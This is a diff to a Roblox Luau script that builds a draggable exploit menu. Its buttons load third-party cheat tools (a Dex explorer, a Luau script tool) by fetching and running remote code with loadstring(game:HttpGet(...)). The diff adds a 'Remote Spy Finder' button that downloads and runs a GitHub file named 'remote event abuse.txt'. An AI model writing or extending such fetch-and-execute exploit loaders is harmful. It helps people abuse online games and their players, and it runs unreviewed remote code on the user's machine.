@@ -9,8 +9,8 @@ gui.Parent = player:WaitForChild("PlayerGui")
 
 local main = Instance.new("Frame")
 main.Parent = gui
-main.Size = UDim2.new(0, 420, 0, 300)
-main.Position = UDim2.new(0.5, -210, 0.5, -150)
+main.Size = UDim2.new(0, 420, 0, 360)
+main.Position = UDim2.new(0.5, -210, 0.5, -180)
 main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 main.BorderSizePixel = 0
 Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
@@ -44,7 +44,7 @@ local title = Instance.new("TextLabel")
 title.Parent = titleBar
 title.Size = UDim2.new(1, -20, 1, 0)
 title.Position = UDim2.new(0, 10, 0, 0)
-title.Text = "BUGGY EXPLORER AND SCANNER SCRIPTS"
+title.Text = "EXPLORER"
 title.TextColor3 = Color3.fromRGB(230, 230, 230)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 20
@@ -94,6 +94,9 @@ ultimateBtn.Parent = container
 local luauBtn = createButton("Luau X")
 luauBtn.Parent = container
 
+local remoteBtn = createButton("Remote Spy Finder")
+remoteBtn.Parent = container
+
 dexBtn.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Dex-Explorer-DPP-73687"))()
 end)
@@ -104,6 +107,10 @@ end)
 
 luauBtn.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Luau-X-SS-V5-rework-50365"))()
+end)
+
+remoteBtn.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/remote%20event%20abuse.txt"))()
 end)
 
 local dragging = false
